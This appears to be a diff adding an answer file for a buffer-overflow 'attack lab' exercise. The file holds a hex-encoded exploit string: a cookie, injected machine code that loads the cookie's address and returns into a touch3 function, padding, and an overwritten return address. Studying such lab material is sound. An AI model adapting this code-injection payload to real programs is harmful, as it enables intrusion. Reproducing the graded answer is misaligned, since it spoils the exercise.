@@ -1,0 +1,15 @@
+/* Here is the string of cookie */
+35 39 62 39 39 37 66 61 00
+
+/* Here is the inject code */
+48 c7 c7 78 dc 61 55 	/* mov    $0x5561dc78,%rdi  # the cookie */
+48 83 ec 30             /* sub    $0x30,%rsp # protect the string in the stack */
+68 fa 18 40 00       	/* pushq  $0x4018fa # the address of touch3 */
+c3                   	/* retq   */
+
+/* Here is the string to overflow the stack */
+49 20 77 61 6e 74 20 74 
+6f 20 72 75 6e 20
+
+/* Here is the address of the inject code in the stack */
+81 dc 61 55 00 00 00 00
